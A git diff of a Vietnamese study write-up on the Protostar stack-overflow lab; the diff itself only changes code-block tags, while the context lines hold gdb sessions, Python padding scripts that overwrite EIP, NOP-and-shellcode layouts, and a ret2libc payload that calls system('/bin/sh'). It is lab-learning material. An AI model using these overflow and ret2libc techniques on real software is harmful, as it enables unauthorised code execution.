@@ -21,7 +21,7 @@ Mình học theo clip của anh ấy đó.
 
 # Một số câu lệnh hữu ích cho dbg
 
-```nasm
+```
 (gdb) set disassembly-flavor intel
 
 ; setting for better illustrate
@@ -45,7 +45,7 @@ vào chế độ `dbg stack0`
 
 - `0x08048415 <main+33>:   test   %eax,%eax` : break chỗ này
 
-```nasm
+```
 
 (gdb) b main
 Breakpoint 1 at 0x80483fd: file stack0/stack0.c, line 10.
@@ -94,7 +94,7 @@ Giải thích tại sao phải 65 kí tự A:
 
 bạn nhìn xem khoảng các từ `0xbffffc60` →  `0xbffffca0` : các phần mình đã tô màu đỏ đó thích các khoảng 16 `0x41414141` và giá trị thứ 17 `0x00000041`  sẽ là giá trị truyền vào `$eax`  mình đã show ở trên tức là chữ A thứ 65. 
 
-```nasm
+```
 (gdb) x/s $eax
 0xbffffc6c:      'A' <repeats 65 times>
 ```
@@ -237,7 +237,7 @@ you have correctly modified the variable
 
 # ./Stack3
 
-```nasm
+```
 define hook-stop
 info registers
 x/24wx $esp
@@ -259,7 +259,7 @@ padding += ('\x24\x84\x04\x08') # 0x8048424 <win>:
 print(padding)
 ```
 
-```nasm
+```
 python checking.py > /tmp/check
 ```
 
@@ -267,7 +267,7 @@ python checking.py > /tmp/check
 
 ### checking where is eip
 
-```nasm
+```
 (gdb) r < /tmp/atoz
 Starting program: /opt/protostar/bin/stack4 < /tmp/atoz
 
@@ -324,7 +324,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 ```
 
-```nasm
+```
 
 $ cat /tmp/checking | ./stack4 ; muốn run không chay gdb thì như này nhé
 code flow successfully changed
@@ -334,7 +334,7 @@ Segmentation fault
 
 # ./stack5
 
-```nasm
+```
 (gdb) set disassembly-flavor intel
 (gdb) disassemble main
 Dump of assembler code for function main:
@@ -351,7 +351,7 @@ End of assembler dump.
 
 ```
 
-```nasm
+```
 ;new define 
 define hook-stop
 x/1i $eip
@@ -397,7 +397,7 @@ print padding+eip+nop+payload
 
 ## ROP
 
-```nasm
+```
 
 info proc map ; giup ban quan sat ko hieu thi tutu hieu hihi mik cx k hieu lam (ngay 24/11/2025
 
@@ -424,7 +424,7 @@ print(padding+ ret  + eip + nop + payload)
 
 ## RET2LIBCcc
 
-```nasm
+```
  p system
 $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
 
@@ -433,7 +433,7 @@ $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
 
 ### return
 
-```nasm
+```
 (gdb) info proc map
 process 12595
 cmdline = '/opt/protostar/bin/stack6'
@@ -459,19 +459,19 @@ Mapped address spaces:
 
 ```
 
-```nasm
+```
  strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
  11f3bf /bin/sh
 
 ```
 
-```nasm
+```
 (gdb) x/s 0xb7e97000+0x11f3bf
 0xb7fb63bf:      "/bin/sh"
 
 ```
 
-```nasm
+```
 
 import struct
 bin_sh= struct.pack("I", 0xb7fb63bf)
@@ -482,7 +482,7 @@ print(padding+ system +ret_after_sys +  bin_sh)
 
 ```
 
-```nasm
+```
 ( python stack6_2.py  ; cat ) | /opt/protostar/bin/stack6
 input path please: got path 0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL                                                                                                                                                                                               MMMMNNNNOOOO▒▒▒QQQQRRRRSSSS▒▒▒AAAA▒c▒
 LS
@@ -502,7 +502,7 @@ checking  check.txt         stack5.py  stack6.py
 
 ![image.png](guide/sbopractice2.png)
 
-```nasm
+```
 
 import struct
 eip = struct.pack("I", 0x08049296)
